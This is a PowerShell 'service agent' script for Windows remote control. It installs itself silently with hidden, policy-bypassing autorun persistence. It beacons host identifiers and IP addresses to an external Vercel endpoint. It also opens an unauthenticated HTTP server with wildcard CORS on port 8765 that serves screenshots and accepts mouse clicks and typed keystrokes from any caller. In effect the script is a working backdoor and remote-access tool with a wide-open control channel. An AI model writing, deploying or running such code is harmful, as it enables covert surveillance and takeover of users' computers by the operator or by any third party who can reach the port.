# UC Service Agent v2.0
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$VERCEL_URL = "https://uc-universal-connect-omega.vercel.app"
$HEARTBEAT_SEC = 30
$CONTROL_PORT = 8765
$INSTALL_DIR = "$env:APPDATA\UCService"
$LOG_FILE = "$INSTALL_DIR\uc.log"

function Log($msg) {
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
    Add-Content $LOG_FILE "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
}

function Get-DeviceInfo {
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
    $publicIp = try { Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5 } catch { "unknown" }
    $screen = Get-WmiObject Win32_VideoController | Select-Object -First 1
    $resolution = "$($screen.CurrentHorizontalResolution)x$($screen.CurrentVerticalResolution)"
    return @{
        deviceId   = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
        name       = $env:COMPUTERNAME
        os         = $os
        ip         = $ip
        publicIp   = $publicIp
        resolution = $resolution
        userId     = "jay"
        user       = $env:USERNAME
        version    = "2.0"
    }
}

function Send-Heartbeat {
    $info = Get-DeviceInfo
    $json = $info | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri "$VERCEL_URL/api/devices" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 10
        return $true
    } catch {
        Log "Heartbeat failed: $($_.Exception.Message)"
        return $false
    }
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()
    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 40)
    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, $encoder, $encoderParams)
    $bitmap.Dispose()
    $bytes = $stream.ToArray()
    $stream.Dispose()
    return [Convert]::ToBase64String($bytes)
}

Add-Type @"
using System.Runtime.InteropServices;
public class UCInput {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int i);
    public static void Click(int x, int y) { SetCursorPos(x,y); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); }
    public static void RClick(int x, int y) { SetCursorPos(x,y); mouse_event(8,0,0,0,0); mouse_event(16,0,0,0,0); }
    public static void DClick(int x, int y) { SetCursorPos(x,y); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); mouse_event(2,0,0,0,0); mouse_event(4,0,0,0,0); }
    public static void Move(int x, int y) { SetCursorPos(x,y); }
}
"@

# === INSTALL ===
New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
$selfPath = $MyInvocation.MyCommand.Path
if ($selfPath) {
    Copy-Item $selfPath "$INSTALL_DIR\UCAgent.ps1" -Force
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "UCService" -Value "powershell.exe -EP Bypass -W Hidden -F `"$INSTALL_DIR\UCAgent.ps1`""
}
Log "Installed to $INSTALL_DIR"

# === HEARTBEAT IN BACKGROUND ===
$heartbeatJob = Start-Job -ScriptBlock {
    param($url, $sec)
    while ($true) {
        try {
            $info = @{
                deviceId = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
                name = $env:COMPUTERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
                resolution = "$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentHorizontalResolution)x$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentVerticalResolution)"
                userId = "jay"
                version = "2.0"
            }
            Invoke-RestMethod -Uri "$url/api/devices" -Method POST -Body ($info | ConvertTo-Json -Compress) -ContentType "application/json" -TimeoutSec 10
        } catch { }
        Start-Sleep -Seconds $sec
    }
} -ArgumentList $VERCEL_URL, $HEARTBEAT_SEC

Log "UC Agent v2.0 started"

# === CONTROL SERVER ===
$listener = New-Object System.Net.HttpListener
try {
    $listener.Prefixes.Add("http://+:$CONTROL_PORT/")
    $listener.Start()
} catch {
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$CONTROL_PORT/")
    $listener.Start()
}
Log "Control server on port $CONTROL_PORT"

while ($listener.IsListening) {
    try {
        $ctx = $listener.GetContext()
        $req = $ctx.Request
        $res = $ctx.Response
        $res.Headers.Add("Access-Control-Allow-Origin", "*")
        $res.Headers.Add("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        $res.Headers.Add("Access-Control-Allow-Headers", "Content-Type")
        if ($req.HttpMethod -eq "OPTIONS") { $res.StatusCode = 200; $res.Close(); continue }

        $path = $req.Url.AbsolutePath
        $body = $null
        if ($req.HasEntityBody) {
            $reader = New-Object System.IO.StreamReader($req.InputStream)
            $body = $reader.ReadToEnd() | ConvertFrom-Json
        }

        $result = '{"error":"not found"}'
        if ($path -eq "/health") { $result = Get-DeviceInfo | ConvertTo-Json -Compress }
        elseif ($path -eq "/screenshot") { $img = Get-Screenshot; $ts = [DateTimeOffset]::Now.ToUnixTimeMilliseconds(); $result = '{"image":"' + $img + '","ts":' + $ts + '}' }
        elseif ($path -eq "/click") { [UCInput]::Click([int]$body.x, [int]$body.y); $result = '{"ok":true}' }
        elseif ($path -eq "/rightclick") { [UCInput]::RClick([int]$body.x, [int]$body.y); $result = '{"ok":true}' }
        elseif ($path -eq "/doubleclick") { [UCInput]::DClick([int]$body.x, [int]$body.y); $result = '{"ok":true}' }
        elseif ($path -eq "/move") { [UCInput]::Move([int]$body.x, [int]$body.y); $result = '{"ok":true}' }
        elseif ($path -eq "/type") { [System.Windows.Forms.SendKeys]::SendWait($body.text); $result = '{"ok":true}' }
        elseif ($path -eq "/key") { [System.Windows.Forms.SendKeys]::SendWait($body.key); $result = '{"ok":true}' }
        else { $res.StatusCode = 404 }

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($result)
        $res.ContentType = "application/json"
        $res.ContentLength64 = $buffer.Length
        $res.OutputStream.Write($buffer, 0, $buffer.Length)
        $res.Close()
    } catch { Log "Error: $($_.Exception.Message)" }
}
